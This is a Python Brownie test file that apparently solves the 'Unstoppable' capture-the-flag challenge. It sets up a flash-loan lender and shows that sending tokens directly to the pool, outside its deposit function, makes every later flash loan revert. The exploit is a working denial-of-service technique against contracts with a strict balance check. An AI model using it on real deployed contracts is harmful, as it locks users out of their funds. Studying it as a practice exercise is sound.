from brownie import (
    exceptions,
    UnstoppableLender,
    DamnValuableToken,
    ReceiverUnstoppable,
)
from web3 import Web3
from scripts.utils import get_account
import pytest

TOKENS_IN_POOL = Web3.toWei("1000000", "ether")
INITIAL_ATTACKER_BALANCE = Web3.toWei("100", "ether")


def before():
    # set up contracts

    deployer = get_account()
    attacker = get_account(1)
    randomUser = get_account(2)
    dvt_token = DamnValuableToken.deploy({"from": deployer})
    lender = UnstoppableLender.deploy(dvt_token.address, {"from": deployer})

    # approve lender for deployer
    dvt_token.approve(lender.address, TOKENS_IN_POOL, {"from": deployer})
    # setup lender with 1,000,000 DVT
    lender.depositTokens(TOKENS_IN_POOL, {"from": deployer})
    # setup attacker with 100 DVT
    dvt_token.transfer(attacker.address, INITIAL_ATTACKER_BALANCE, {"from": deployer})

    assert dvt_token.balanceOf(lender.address) == TOKENS_IN_POOL
    assert dvt_token.balanceOf(attacker.address) == INITIAL_ATTACKER_BALANCE

    # assert random user can execute flashloan
    receiver = ReceiverUnstoppable.deploy(lender.address, {"from": randomUser})
    receiver.executeFlashLoan(10, {"from": randomUser})
    return dvt_token, lender, receiver


def run_exploit(dvt_token, lender):
    attacker = get_account(1)
    attacker_receiver = ReceiverUnstoppable.deploy(lender.address, {"from": attacker})
    dvt_token.transfer(lender.address, Web3.toWei(1, "ether"))


def after(receiver):
    randomUser = get_account(2)
    with pytest.raises(exceptions.VirtualMachineError):
        receiver.executeFlashLoan(10, {"from": randomUser})


def test_unstoppable_challenge():
    dvt_token, lender, receiver = before()
    run_exploit(dvt_token, lender)
    after(receiver)
